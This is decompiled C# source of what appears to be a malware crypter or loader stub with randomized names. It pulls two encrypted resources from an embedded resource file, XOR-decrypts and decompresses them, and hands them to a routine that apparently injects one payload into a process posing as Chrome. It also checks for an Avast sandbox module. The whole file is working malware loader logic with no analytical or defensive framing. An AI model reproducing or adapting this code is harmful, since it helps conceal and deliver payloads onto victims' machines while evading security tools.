using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class jhujdfzigw
{
	private static Assembly szzuifejgt = Assembly.GetExecutingAssembly();

	private static ResourceManager oklzdiwwch = new ResourceManager("Hamza", szzuifejgt);

	private static bool xcqkihbxbe = false;

	private static bool tmdpckulys = false;

	[STAThread]
	public static void dehaikylxq()
	{
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Process.GetCurrentProcess().Modules.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					if (Operators.CompareString(processModule.ModuleName, "snxhk.dll", false) != 0)
					{
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			zrnszsateb zrnszsateb2 = new zrnszsateb(ihzqimvatb(), "Alternative", "Running", new object[7]
			{
				mwmkojcmxn(),
				"%ProcessName%",
				"",
				"Oui",
				"google ",
				"chrome",
				"chrome"
			});
			zrnszsateb2.qacvqxemqa();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	private static byte[] mwmkojcmxn()
	{
		return ftabunbpoh(arilulebsw((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(oklzdiwwch.GetObject("First")) }, (string[])null, (Type[])null, (bool[])null)));
	}

	[SpecialName]
	private static byte[] ihzqimvatb()
	{
		return ftabunbpoh(arilulebsw((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(oklzdiwwch.GetObject("Second")) }, (string[])null, (Type[])null, (bool[])null)));
	}

	public static byte[] arilulebsw(byte[] rzeaomzasy)
	{
		checked
		{
			byte[] array = new byte[rzeaomzasy.Length - 16 - 1 + 1];
			Buffer.BlockCopy(rzeaomzasy, 16, array, 0, array.Length);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = unchecked((byte)(array[i] ^ rzeaomzasy[i % 16]));
			}
			return array;
		}
	}

	public static byte[] ftabunbpoh(byte[] wbvqooxpoj)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(wbvqooxpoj, 0, wbvqooxpoj.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	public static object pyihtsvsfd(Type bemhoqudkv, string kwrruqyejs, object[] uowczpcejp)
	{
		return bemhoqudkv.InvokeMember(kwrruqyejs, BindingFlags.InvokeMethod, null, null, uowczpcejp);
	}
}
